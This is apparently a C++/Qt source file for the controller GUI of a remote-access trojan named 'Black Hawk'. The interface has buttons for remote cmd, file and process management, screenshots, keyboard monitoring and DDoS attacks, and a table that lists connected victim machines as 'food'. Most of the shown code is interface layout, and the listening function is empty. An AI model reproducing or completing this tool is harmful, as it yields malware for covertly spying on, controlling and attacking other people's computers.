#include "hunter.h"
#include "ui_hunter.h"

Hunter::Hunter(QWidget *parent)
    : QWidget(parent)
    , ui(new Ui::Hunter)
{
    ui->setupUi(this);

    // -------------------------------------------界面设计------------------------------------------------
    // 主窗口
    this->setWindowTitle("Black Hawk 远控软件服务端 by lfish");
    this->setFixedSize(700, 500);

    // 按键区
    ui->btFile->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btCmd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btScreen->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btProcess->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btDDos->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);
    ui->btKeybd->setSizePolicy(QSizePolicy::Preferred, QSizePolicy::Preferred);

    ui->btFile->setText("文件管理");
    ui->btCmd->setText("远程cmd");
    ui->btScreen->setText("屏幕截图");
    ui->btDDos->setText("DDOS攻击");
    ui->btProcess->setText("进程管理");
    ui->btKeybd->setText("键盘监控");

    // 设置区
    ui->widgetOption->setFixedHeight(200);

    // 初始化区
    ui->widgetInit->setFixedWidth(200);

    ui->labelIP->setText("IP");
    ui->labelPort->setText("端口");
    ui->labelIP->setAlignment(Qt::AlignCenter);
    ui->labelPort->setAlignment(Qt::AlignCenter);

    ui->btStart->setText("开始监听");
    ui->btStop->setText("停止监听");

    // 上线表格区
    ui->tableOnline->setColumnCount(5);
    ui->tableOnline->setHorizontalHeaderItem(0, new QTableWidgetItem("ID"));
    ui->tableOnline->setHorizontalHeaderItem(1, new QTableWidgetItem("用户名"));
    ui->tableOnline->setHorizontalHeaderItem(2, new QTableWidgetItem("IP地址"));
    ui->tableOnline->setHorizontalHeaderItem(3, new QTableWidgetItem("端口号"));
    ui->tableOnline->setHorizontalHeaderItem(4, new QTableWidgetItem("系统信息"));
    // 自适应列宽
    ui->tableOnline->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
    // 隐藏水平表头
    ui->tableOnline->verticalHeader()->setHidden(true);
    // 一行一行地选中
    ui->tableOnline->setSelectionBehavior(QAbstractItemView::SelectRows);
    // 一次最多选中一行
    ui->tableOnline->setSelectionMode(QAbstractItemView::SingleSelection);
    // 设置不可更改
    ui->tableOnline->setEditTriggers(QAbstractItemView::NoEditTriggers);
    ui->tableOnline->setContextMenuPolicy(Qt::CustomContextMenu);

    // 右键出现的每一项的菜单 连接对应逻辑
    mRclick = new QMenu(this);
    QAction *actSendBox = mRclick->addAction("发送弹窗");
    QAction *actReboot = mRclick->addAction("重启电脑");
    QAction *actOffline = mRclick->addAction("强制下线");

    // 将菜单添加至鼠标事件中 再拦截鼠标事件得以处理
    mRclick->installEventFilter(this);


    // 测试
    mCook = new Cook(this);
    connect(mCook, SIGNAL(foodLogin(int,QString,QString,int,QString)),
            this, SLOT(addFoodToTbl(int,QString,QString,int,QString)));
    connect(mCook, SIGNAL(foodLogout(int)), this, SLOT(rmFoodFromTbl(int)));
    mCook->start(18000);



}

Hunter::~Hunter()
{
    delete ui;
}


// ------------------------------------几个功能按键逻辑----------------------------------------

// 添加食物列表
void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo){

    // 增加一行
    int count = ui->tableOnline->rowCount();
    ui->tableOnline->setRowCount(count + 1);

    // 添加信息
    QTableWidgetItem *itemId = new QTableWidgetItem(QString::number(id));
    ui->tableOnline->setItem(count, 0 , itemId);

    QTableWidgetItem *itemUsername = new QTableWidgetItem(username);
    ui->tableOnline->setItem(count, 1 , itemUsername );

    QTableWidgetItem *itemIpaddr = new QTableWidgetItem(ipaddr);
    ui->tableOnline->setItem(count, 2 , itemIpaddr);

    QTableWidgetItem *itemPort = new QTableWidgetItem(QString::number(port));
    ui->tableOnline->setItem(count, 3 , itemPort);

    QTableWidgetItem *itemSysInfo = new QTableWidgetItem(sysInfo);
    ui->tableOnline->setItem(count, 4 , itemSysInfo);
}

// 删除食物
void Hunter::rmFoodFromTbl(int id){

    // 用ID判断该删除的行索引
    int count = ui->tableOnline->rowCount();
    for (int i = 0; i< count; i++) {
        if (ui->tableOnline->item(i, 0)->text().toInt() == id) {
            // 删除
            ui->tableOnline->removeRow(i);
            break;
        }
    }
}

// 返回当前选中食物ID
int Hunter::curFoodIdInTbl(){
    int index = ui->tableOnline->currentRow();
    if (index == -1) {
        return -1;
    }
    return ui->tableOnline->item(index, 0)->text().toInt();
}

// 开启服务器监听
void Hunter::startLstn(){

}

// 重写事件过滤函数
bool Hunter::eventFilter(QObject *watched, QEvent *event){
    // 右键弹出菜单
    if (watched == (QObject*)ui->tableOnline) {
        if (event->type() == QEvent::ContextMenu) {
           mRclick->exec(QCursor::pos());
        }
    }

    return QObject::eventFilter(watched, event);
}
